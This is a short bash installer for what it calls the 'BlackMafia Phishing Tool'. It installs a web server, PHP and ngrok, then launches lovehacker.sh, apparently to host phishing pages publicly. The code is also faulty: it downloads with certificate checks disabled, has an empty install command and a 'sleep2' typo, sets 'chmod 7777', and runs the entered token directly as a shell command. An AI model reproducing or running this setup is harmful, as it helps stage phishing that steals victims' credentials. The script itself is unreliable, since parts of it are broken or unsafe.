#!/bin/bash
echo ""
clear
echo ""
echo ""
echo ""
echo ""
echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m⛔ Ngrok  Installation  ⛔ \e[0m'
sleep 3
clear
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  ⛔         DOWNLOAD REQUIREMENTS         ⛔\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
termux-setup-storage
sudo apt-get install apache2 -y
apt install 
apt install ruby -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
pkg install wget -y
pkg install ruby -y
pkg install gem -y
gem install lolcat
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip --no-check-certificate
unzip ngrok-stable-linux-arm.zip
cp -R ngrok lovehacker404 BlackMafia/
chmod 7777 lovehacker.sh
clear
echo ""
echo -e $'\e[1;91m[\e[0m\e[1;33m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m  https://ngrok.com   ⛔\e[0m'
echo -e $'\e[1;91m[\e[0m\e[1;35m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m  Login Ngrok WebSite ⛔\e[0m'
echo -e $'\e[1;91m[\e[0m\e[1;32m ⛔ \e[0m\e[1;96m]\e[0m\e[1;92m  Copy Ngrok Token    ⛔\e[0m'
echo ""
read -p $'\e[1;91m[\e[0m\e[1;71m ⛔ \e[0m\e[1;91m]\e[0m\e[1;95m  Enter Token ➡️ : \e[0m' token
$token
sleep2
clear
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;95m   -------------------------------------- \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m ⛔       Installation Successfull       ⛔  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m ⛔ WellCome To BlackMafia Phishing Tool ⛔  \e[1;91m\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;96m\e[0m\e[1;95m   -------------------------------------- \e[1;91m\e[0m'
sleep 4
./lovehacker.sh
